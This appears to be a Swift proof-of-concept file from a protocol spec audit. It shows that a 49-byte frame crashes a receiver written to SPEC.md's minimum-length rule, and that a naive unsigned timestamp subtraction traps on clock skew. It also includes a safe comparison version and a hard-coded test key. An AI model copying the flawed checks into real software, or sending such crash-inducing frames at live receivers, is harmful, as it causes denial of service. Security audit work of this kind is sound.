// T2 adversarial PoCs, Swift side. Implements SPEC.md exactly as written.
// Build: swiftc -O -o attack attack.swift
// Run:   ./attack a1 | ./attack a2
// Both subcommands are EXPECTED to crash. That is the finding.
import CryptoKit
import Foundation

let H = 33, N = 12, T = 16
let SPEC_MIN_FRAME = 49        // SPEC.md §3 and §4 step 1, verbatim
let SPEC_MAX_FRAME = 65_597    // SPEC.md §3

func unhex(_ s: String) -> [UInt8] {
    var out: [UInt8] = []; var it = s.startIndex
    while it < s.endIndex {
        let n = s.index(it, offsetBy: 2)
        out.append(UInt8(s[it..<n], radix: 16)!); it = n
    }
    return out
}

// ---- A1: slice by SPEC.md's offsets after SPEC.md's length check ----
func specConformantOpen(key: SymmetricKey, frame: [UInt8]) throws -> [UInt8] {
    guard frame.count >= SPEC_MIN_FRAME else { throw NSError(domain: "too_short", code: 1) }
    guard frame.count <= SPEC_MAX_FRAME else { throw NSError(domain: "too_long", code: 1) }
    guard frame[0] == 0x01 else { throw NSError(domain: "bad_version", code: 1) }

    let aad   = Array(frame[0..<H])
    let nonce = Array(frame[H..<(H + N)])
    let ct    = Array(frame[(H + N)..<(frame.count - T)])   // <-- lowerBound > upperBound
    let tag   = Array(frame[(frame.count - T)...])
    let box = try ChaChaPoly.SealedBox(nonce: try ChaChaPoly.Nonce(data: Data(nonce)),
                                       ciphertext: Data(ct), tag: Data(tag))
    _ = aad
    return [UInt8](try ChaChaPoly.open(box, using: key, authenticating: Data(aad)))
}

// ---- A2: SPEC.md §4 step 5 over the uint64 field declared in §2 ----
func step5AsSpecced(nowMs: UInt64, timestampMs: UInt64) -> Bool {
    // "Reject if |now - timestamp_ms| > 60_000"
    let delta = nowMs > timestampMs ? nowMs - timestampMs : timestampMs - nowMs
    return delta <= 60_000
}
func step5NaiveAsSpecced(nowMs: UInt64, timestampMs: UInt64) -> Bool {
    // The literal transcription: subtract, then take the magnitude.
    let delta = nowMs - timestampMs          // traps on overflow when ts > now
    return delta <= 60_000
}

let which = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : "a1"
let key = SymmetricKey(data: Data(unhex("4f8a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a")))

switch which {
case "a1":
    var evil = [UInt8](repeating: 0, count: 49)
    evil[0] = 0x01
    FileHandle.standardError.write("A1: feeding a 49-byte frame to a receiver written to SPEC.md §4 step 1\n".data(using: .utf8)!)
    FileHandle.standardError.write("    (49 >= SPEC_MIN_FRAME, so the length check passes)\n".data(using: .utf8)!)
    _ = try? specConformantOpen(key: key, frame: evil)   // `try?` cannot catch a range trap
    FileHandle.standardError.write("    reached the end without crashing -- unexpected\n".data(using: .utf8)!)

case "a2":
    let now: UInt64 = 1_757_600_000_000
    FileHandle.standardError.write("A2: §4 step 5, sender clock 1 ms ahead of receiver\n".data(using: .utf8)!)
    FileHandle.standardError.write("    now = \(now), timestamp_ms = \(now + 1)\n".data(using: .utf8)!)
    let r = step5NaiveAsSpecced(nowMs: now, timestampMs: now + 1)
    FileHandle.standardError.write("    returned \(r) -- unexpected\n".data(using: .utf8)!)

case "a2b":
    // The careful branchy version is safe; shown so the finding is precise.
    let now: UInt64 = 1_757_600_000_000
    for skew in [0, 1, 1_000, 59_000, 61_000] as [UInt64] {
        print("  ts = now + \(skew): accept = \(step5AsSpecced(nowMs: now, timestampMs: now + skew))")
    }

default:
    print("usage: attack a1|a2|a2b")
}
